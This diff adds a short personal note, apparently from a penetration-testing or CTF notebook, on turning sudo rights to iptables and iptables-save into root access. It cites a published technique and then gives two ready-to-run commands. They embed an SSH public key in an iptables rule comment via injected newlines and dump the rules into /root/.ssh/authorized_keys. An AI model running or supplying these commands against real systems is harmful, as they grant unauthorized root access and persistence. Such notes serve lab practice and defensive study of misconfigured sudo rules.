@@ -1,0 +1,15 @@
+You just got the next results from sudo l:
+
+(root) NOPASSWD: /usr/sbin/iptables
+(root) NOPASSWD: /usr/sbin/iptables-save
+
+
+exploit: (https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/)
+Using the comment functionality offered by iptables to attach arbitrary comments, containing newlines, to rules.
+Leverage iptables-save to dump to a sensitive file the content of the loaded rules, including the comment payloads.
+Exploiting step 1 and step 2 to overwrite the /etc/passwd file with an attacker-controlled root entry, crafted with a known password.
+
+
+in this case i did put in comment my ssh key and then i dumped the iptables (plus my key) to the authorized_keys. So, i got a preveleged root access.
+sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAA???????????????? root@kali\n'
+sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
